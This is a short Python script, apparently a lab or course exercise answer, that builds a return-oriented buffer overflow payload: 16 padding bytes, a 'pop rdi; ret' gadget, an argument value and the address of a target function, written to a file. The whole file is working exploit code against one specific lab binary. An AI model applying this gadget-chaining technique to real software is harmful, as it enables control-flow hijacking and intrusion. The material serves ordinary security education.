# answer2.py
import struct

OFFSET = 16
POP_RDI_RET = 0x4012c7   # pop rdi; ret
ARG = 0x3f8              # func2 期望的参数
FUNC2 = 0x401216         # func2 入口地址

payload  = b"A" * OFFSET
payload += struct.pack("<Q", POP_RDI_RET)
payload += struct.pack("<Q", ARG)
payload += struct.pack("<Q", FUNC2)

with open("payload2", "wb") as f:
    f.write(payload)

print("[+] wrote payload2, len =", len(payload))
